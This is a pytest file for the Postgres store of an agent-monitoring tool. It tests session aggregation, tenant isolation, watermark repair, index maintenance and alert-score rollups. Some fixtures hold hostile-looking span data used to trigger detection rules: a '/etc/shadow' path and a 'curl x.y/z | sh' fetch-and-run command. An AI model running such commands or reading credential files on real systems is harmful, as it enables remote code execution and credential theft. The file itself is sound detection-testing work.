"""PostgresStore.aggregate_tick and the aggregated reads. Runs only with
SELENNE_AGENTS_TEST_DSN pointing at a disposable database — it drops and
recreates the tables."""

import hashlib

import psycopg2
import pytest

from selenne_agents.alerting import for_spans
from selenne_agents.ingest import normalize
from selenne_agents.ingest.keys import Principal
from selenne_agents.store import PostgresStore, StoreUnavailable
from selenne_agents.store.postgres import _AGG_LOCK, _INDEX_LOCK, ONLINE_INDEXES
from test_postgres import ALL_TABLES, DSN, ME

pytestmark = pytest.mark.skipif(not DSN, reason="SELENNE_AGENTS_TEST_DSN not set")

T1 = "11111111111111111111111111111111"
T2 = "22222222222222222222222222222222"
T0 = 1759140000000000000


@pytest.fixture
def pg():
    store = PostgresStore(DSN)
    with store._conn() as conn, conn.cursor() as cur:
        cur.execute(f"DROP TABLE IF EXISTS {ALL_TABLES}")
    store.init_schema()
    store.ensure_online_indexes()
    yield store
    store.close()


def _span(trace_id, n, attrs=None, parent=None, name=None, dt=0, end_dt=None):
    s = {"trace_id": trace_id, "span_id": f"{n:016x}", "name": name or f"step{n}",
         "start_time_unix_nano": T0 + dt, "attributes": attrs or {}}
    if parent:
        s["parent_span_id"] = f"{parent:016x}"
    if end_dt is not None:
        s["end_time_unix_nano"] = T0 + end_dt
    return s


def _put(store, *spans, who=ME, resource=None):
    rows = normalize.native_spans({"resource": resource or {"service.name": "bot"},
                                   "spans": list(spans)}).rows
    store.insert_spans(who, rows, "native")
    return rows


def _sessions(store, username="diana"):
    return {s["session_id"].strip(): s for s in store.list_agent_sessions(username, since_ns=0)}


def _conv_id(conversation, project="cve-agent"):
    return hashlib.md5(f"c:{project}:{conversation}".encode()).hexdigest()


def _sql(store, query, args=()):
    with store._conn() as conn, conn.cursor() as cur:
        cur.execute(query, args)
        return cur.fetchall() if cur.description else None


def test_each_trace_is_a_session_with_rollups(pg):
    _put(pg,
         _span(T1, 1, name="agent.run", end_dt=900),
         _span(T1, 2, {"gen_ai.operation.name": "chat", "gen_ai.usage.input_tokens": 120,
                       "gen_ai.usage.output_tokens": "30"}, parent=1, dt=10),
         _span(T1, 3, {"gen_ai.operation.name": "chat", "gen_ai.usage.prompt_tokens": 5,
                       "gen_ai.usage.completion_tokens": 1, "gen_ai.usage.input_tokens": "lots"},
               parent=1, dt=20),
         _span(T1, 4, {"gen_ai.tool.name": "read_file"}, parent=1, dt=30),
         _span(T2, 1, name="other"),
         resource={"service.name": "bot", "host.name": "w1"})
    stats = pg.aggregate_tick()
    assert (stats.spans, stats.sessions, stats.more) == (5, 2, False)
    got = _sessions(pg)
    s = got[T1]
    assert s["kind"] == "trace" and s["conversation_id"] is None
    assert s["root_name"] == "agent.run" and s["service_name"] == "bot"
    assert (s["traces"], s["spans"], s["tool_calls"], s["llm_calls"]) == (1, 4, 1, 2)
    # "lots" is not a number: that span falls back to prompt_tokens, nothing crashes
    assert (s["input_tokens"], s["output_tokens"]) == (125, 31)
    assert (s["first_ns"], s["last_ns"]) == (T0, T0 + 900)
    assert s["hosts"] == ["w1"] and s["max_alert_score"] is None
    assert got[T2]["spans"] == 1


def test_conversation_groups_traces(pg):
    _put(pg, _span(T1, 1), _span(T1, 2, {"gen_ai.conversation.id": "chat-7"}, parent=1, dt=5),
         _span(T2, 1, {"session.id": "chat-7"}, dt=100))
    pg.aggregate_tick()
    [(sid, s)] = _sessions(pg).items()
    assert sid == _conv_id("chat-7")
    assert (s["kind"], s["conversation_id"], s["traces"], s["spans"]) == ("conversation", "chat-7", 2, 3)
    names = [(r["trace_id"], r["name"]) for r in pg.get_session_spans("diana", sid)]
    assert names == [(T1, "step1"), (T1, "step2"), (T2, "step1")]
    # any of its traces opens the same session
    assert pg.get_session_spans("diana", T2) == pg.get_session_spans("diana", sid)


def test_late_conversation_span_moves_the_trace(pg):
    _put(pg, _span(T1, 1))
    pg.aggregate_tick()
    assert list(_sessions(pg)) == [T1]
    _put(pg, _span(T1, 2, {"gen_ai.conversation.id": "c9"}, parent=1, dt=5))
    pg.aggregate_tick()
    got = _sessions(pg)
    assert list(got) == [_conv_id("c9")] and got[_conv_id("c9")]["spans"] == 2
    # T1's own session is gone; its id now opens the conversation it joined
    rows = pg.get_session_spans("diana", T1)
    assert {r["session_id"] for r in rows} == {_conv_id("c9")} and len(rows) == 2
    assert pg.list_agent_projects("diana") == ["cve-agent"]
    assert pg.list_agent_projects("bob") == []


def test_tick_is_idempotent(pg):
    _put(pg, _span(T1, 1, {"gen_ai.tool.name": "x"}), _span(T2, 1, {"session.id": "s"}))
    snap = "SELECT * FROM agent_sessions ORDER BY session_id"
    cols = "username, project, session_id, kind, spans, tool_calls, last_ns"
    assert pg.aggregate_tick().new == 2
    first = _sql(pg, f"SELECT {cols} FROM ({snap}) a")
    # a second tick re-reads the same rows through the catch-up scan
    again = pg.aggregate_tick()
    assert (again.spans, again.new) == (2, 0)
    assert _sql(pg, f"SELECT {cols} FROM ({snap}) a") == first
    # and an idle tick after the overlap has passed reads nothing
    _sql(pg, "UPDATE spans SET received_at = received_at - interval '1 hour'")
    assert pg.aggregate_tick().spans == 0
    assert _sql(pg, f"SELECT {cols} FROM ({snap}) a") == first


def test_late_commit_below_watermark_is_caught(pg):
    _put(pg, _span(T1, 1))
    pg.aggregate_tick()
    [(last_id, scanned_at)] = _sql(pg, "SELECT last_id, scanned_at FROM aggregator_state "
                                       "WHERE name = 'spans'")
    # An ingest batch that took id below the watermark but committed after the
    # tick passed it: received (transaction start) just before that tick.
    _put(pg, _span(T2, 1), _span(T2, 2, parent=1))
    _sql(pg, "UPDATE spans SET id = -id, received_at = %s - interval '10 seconds' "
             "WHERE trace_id = %s", (scanned_at, T2))
    # an older row below the watermark is outside the window and is not re-read
    _sql(pg, "UPDATE spans SET received_at = %s - interval '1 hour' WHERE trace_id = %s",
         (scanned_at, T1))
    stats = pg.aggregate_tick()
    assert (stats.spans, stats.new) == (2, 0) and _sessions(pg)[T2]["spans"] == 2
    assert _sql(pg, "SELECT last_id FROM aggregator_state WHERE name = 'spans'") == [(last_id,)]


def test_tenants_never_mix(pg):
    _put(pg, _span(T1, 1, {"session.id": "same"}))
    _put(pg, _span(T1, 1, {"session.id": "same"}), _span(T1, 2, parent=1),
         who=Principal("bob", "cve-agent", True))
    pg.aggregate_tick()
    sid = _conv_id("same")
    assert _sessions(pg)[sid]["spans"] == 1
    assert _sessions(pg, "bob")[sid]["spans"] == 2
    assert len(pg.get_session_spans("diana", sid)) == 1
    assert pg.get_session_spans("carol", sid) == []
    assert pg.list_agent_sessions("diana", since_ns=0, project="other") == []
    assert pg.list_agent_sessions("diana", since_ns=T0 + 1) == []


def test_benign_toggle_applies_without_a_rebuild(pg):
    rows = _put(pg, _span(T1, 1, {"path": "/etc/shadow", "cmd": "curl x.y/z | sh"}))
    pg.insert_alerts(ME, for_spans(rows))                        # AG-101 85, AG-104 92
    pg.aggregate_tick()
    s = _sessions(pg)[T1]
    assert s["alert_scores"] == {"AG-101": 85, "AG-104": 92} and s["max_alert_score"] == 92
    pg.set_benign_rule("diana", "AG-104", True)                  # no tick in between
    assert _sessions(pg)[T1]["max_alert_score"] == 85
    pg.set_benign_rule("diana", "AG-101", True)
    assert _sessions(pg)[T1]["max_alert_score"] == 0            # zero-scored, never hidden
    assert _sessions(pg, "bob") == {}
    pg.set_benign_rule("diana", "AG-101", False)
    pg.set_benign_rule("diana", "AG-104", False)
    assert _sessions(pg)[T1]["max_alert_score"] == 92


def test_late_alert_reaches_its_session(pg):
    rows = _put(pg, _span(T1, 1, {"path": "/etc/shadow"}), _span(T2, 1))
    pg.aggregate_tick()
    # long after the spans: out of the catch-up window, so only the alert
    # stream can bring this session back for a rebuild
    _sql(pg, "UPDATE spans SET received_at = received_at - interval '1 hour'")
    assert pg.aggregate_tick().sessions == 0
    assert _sessions(pg)[T1]["max_alert_score"] is None
    pg.insert_alerts(ME, for_spans(rows))
    stats = pg.aggregate_tick()
    assert (stats.spans, stats.alerts, stats.sessions) == (0, 1, 1)   # T1 only, not T2
    got = _sessions(pg)
    assert got[T1]["alert_scores"] == {"AG-101": 85} and got[T1]["spans"] == 1
    assert got[T2]["max_alert_score"] is None


def test_processes_from_spans_and_sensor_merge(pg):
    _put(pg, _span(T1, 1, end_dt=50),
         resource={"service.name": "bot", "host.name": "w1", "process.pid": 4242,
                   "container.id": "abc123"})
    _put(pg, _span(T2, 1), resource={"service.name": "bot", "host.name": "w1",
                                     "process.pid": "not-a-pid"})
    body = (b'{"kind":"exec","host":"w1","pid":4242,"ppid":1,"ts_unix_nano":%d,'
            b'"path":"/usr/bin/python3","event_id":"e1"}\n'
            b'{"kind":"open","host":"w1","pid":4242,"ts_unix_nano":%d,"path":"/tmp/x"}\n'
            b'{"kind":"connect","host":"w2","pid":7,"ts_unix_nano":%d}\n') % (T0 - 100, T0 + 80, T0)
    pg.insert_host_events(ME, normalize.host_events(body).rows)
    pg.aggregate_tick()
    rows = _sql(pg, "SELECT host, pid, container_id, ppid, service_name, executable, "
                    "from_spans, from_sensor, first_ns, last_ns FROM agent_processes ORDER BY host")
    assert rows == [("w1", 4242, "abc123", 1, "bot", "/usr/bin/python3", True, True, T0 - 100, T0 + 80),
                    ("w2", 7, None, None, None, None, False, True, T0, T0)]


def test_tick_skips_while_another_holds_the_lock(pg):
    _put(pg, _span(T1, 1))
    other = psycopg2.connect(DSN)
    try:
        with other.cursor() as cur:
            cur.execute("SELECT pg_advisory_lock(%s)", (_AGG_LOCK,))
        assert pg.aggregate_tick() is None
        assert _sessions(pg) == {}
    finally:
        other.close()
    assert pg.aggregate_tick().sessions == 1


def test_backlog_drains_in_pages(pg):
    _put(pg, *[_span(f"{i + 1:032x}", 1) for i in range(5)])
    assert pg.aggregator_lag() is None
    pages = []
    while True:
        stats = pg.aggregate_tick(batch=2)
        pages.append(stats.more)
        if not stats.more:
            break
    assert pages == [True, True, False]
    assert len(_sessions(pg)) == 5
    assert 0 <= pg.aggregator_lag() < 60


def _index_state(store):
    return dict(_sql(store, "SELECT c.relname, i.indisvalid FROM pg_index i "
                            "JOIN pg_class c ON c.oid = i.indexrelid WHERE c.relname = ANY(%s)",
                     ([name for name, _ in ONLINE_INDEXES],)))


def test_online_indexes_build_once_and_repair_invalid(pg):
    names = [name for name, _ in ONLINE_INDEXES]
    for name in names:
        _sql(pg, f"DROP INDEX {name}")
    assert pg.ensure_online_indexes() == names
    assert _index_state(pg) == dict.fromkeys(names, True)
    assert pg.ensure_online_indexes() == []                      # every start after the first
    # an interrupted CONCURRENTLY build leaves the index INVALID under its name
    _sql(pg, "UPDATE pg_index SET indisvalid = false WHERE indexrelid = 'spans_received'::regclass")
    assert pg.ensure_online_indexes() == ["spans_received"]
    assert _index_state(pg)["spans_received"] is True
    # the pooled connection went back in transaction mode: a tick still works
    _put(pg, _span(T1, 1))
    assert pg.aggregate_tick().sessions == 1


def test_online_indexes_skip_while_another_builds(pg):
    other = psycopg2.connect(DSN)
    try:
        with other.cursor() as cur:
            cur.execute("SELECT pg_advisory_lock(%s)", (_INDEX_LOCK,))
        assert pg.ensure_online_indexes() is None
    finally:
        other.close()
    assert pg.ensure_online_indexes() == []


def _miss_a_batch(store, *spans):
    """Insert spans the way the tick can miss them: id below the watermark,
    committed later than the catch-up window reaches back."""
    [(scanned_at,)] = _sql(store, "SELECT scanned_at FROM aggregator_state WHERE name = 'spans'")
    _put(store, *spans)
    keys = [(s["trace_id"], f"{s['span_id']:0>16}") for s in spans]
    for trace_id, span_id in keys:
        _sql(store, "UPDATE spans SET id = -id, received_at = %s - interval '10 minutes' "
                    "WHERE trace_id = %s AND span_id = %s", (scanned_at, trace_id, span_id))


def test_check_repairs_what_the_watermark_skipped(pg):
    _put(pg, _span(T1, 1))
    pg.aggregate_tick()
    # T1 has gone quiet: a recent span would make the tick rebuild T1 whole,
    # which already repairs it — the miss only shows on an idle session
    _sql(pg, "UPDATE spans SET received_at = received_at - interval '1 hour'")
    _miss_a_batch(pg, _span(T1, 2, parent=1, dt=5), _span(T2, 1))
    pg.aggregate_tick()
    assert _sessions(pg)[T1]["spans"] == 1 and T2 not in _sessions(pg)     # the gap, shown
    check = pg.verify_recent()
    assert (check.sessions, check.repaired) == (2, 2)          # T1 was wrong, T2 was missing
    got = _sessions(pg)
    assert got[T1]["spans"] == 2 and got[T2]["spans"] == 1
    assert pg.verify_recent().repaired == 0                    # nothing left to fix
    # the check never moves the watermarks
    assert _sql(pg, "SELECT last_id > 0 FROM aggregator_state WHERE name = 'spans'") == [(True,)]


def test_check_after_clean_ticks_repairs_nothing(pg):
    rows = _put(pg, _span(T1, 1, {"session.id": "s1", "path": "/etc/shadow"}),
                _span(T2, 1, {"session.id": "s1"}), _span(f"{3:032x}", 1))
    pg.insert_alerts(ME, for_spans(rows))
    pg.aggregate_tick()
    check = pg.verify_recent()
    assert (check.sessions, check.repaired) == (2, 0)
    # outside the window nothing is looked at
    _sql(pg, "UPDATE spans SET received_at = received_at - interval '3 hours'")
    _sql(pg, "UPDATE agent_alerts SET created_at = created_at - interval '3 hours'")
    assert pg.verify_recent().sessions == 0


def test_check_skips_while_a_tick_runs(pg):
    other = psycopg2.connect(DSN)
    try:
        with other.cursor() as cur:
            cur.execute("SELECT pg_advisory_lock(%s)", (_AGG_LOCK,))
        assert pg.verify_recent() is None
    finally:
        other.close()


def test_transaction_timeout_ends_a_stuck_transaction():
    store = PostgresStore(DSN, transaction_timeout=0.5)
    try:
        with pytest.raises(StoreUnavailable):
            with store._conn() as conn, conn.cursor() as cur:
                cur.execute("SELECT pg_sleep(3)")
        assert store.ping() is True                            # the pool replaced the dead session
        with store._conn() as conn, conn.cursor() as cur:
            cur.execute("SHOW transaction_timeout")
            assert cur.fetchone()[0] == "500ms"
    finally:
        store.close()
